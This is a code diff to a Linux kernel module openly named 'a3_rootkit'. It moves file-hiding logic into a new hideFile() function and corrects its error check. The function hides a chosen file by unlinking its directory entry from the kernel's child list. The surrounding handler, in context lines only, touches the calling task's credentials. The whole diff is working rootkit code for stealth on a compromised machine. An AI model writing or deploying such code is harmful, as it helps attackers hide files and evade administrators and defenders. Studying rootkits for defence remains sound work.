@@ -29,9 +29,6 @@ static ssize_t a3_rootkit_write(struct file * __file, const char __user * user_b
     struct task_struct * task = current;
 	struct cred * old = task->real_cred;
 
-    struct file * hide_file = NULL;
-    struct dentry * hide_dentry;
-
     char *param, *filename;
     int temp;
 
@@ -53,16 +50,7 @@ static ssize_t a3_rootkit_write(struct file * __file, const char __user * user_b
         for (temp = 0; filename[temp++] == ' '; )
             filename = &(filename[temp]);
         
-        hide_file = filp_open(filename, O_RDONLY, 0);
-        if (hide_file != NULL)
-        {
-            hide_dentry = hide_file->f_path.dentry;
-
-            hide_dentry->d_child.next->prev = hide_dentry->d_child.prev;
-            hide_dentry->d_child.prev->next = hide_dentry->d_child.next;
-
-            filp_close(hide_file, NULL);
-        }
+        hideFile(filename);
     }
 
     kfree(param);
@@ -120,3 +108,19 @@ static long a3_rootkit_ioctl(struct file * __file, unsigned int cmd, unsigned lo
     return 0;
 }
 
+static void hideFile(const char * filename)
+{
+    struct file * hide_file = NULL;
+    struct dentry * hide_dentry;
+
+    hide_file = filp_open(filename, O_RDONLY, 0);
+    if (!IS_ERR(hide_file))
+    {
+        hide_dentry = hide_file->f_path.dentry;
+
+        hide_dentry->d_child.next->prev = hide_dentry->d_child.prev;
+        hide_dentry->d_child.prev->next = hide_dentry->d_child.next;
+
+        filp_close(hide_file, NULL);
+    }
+}
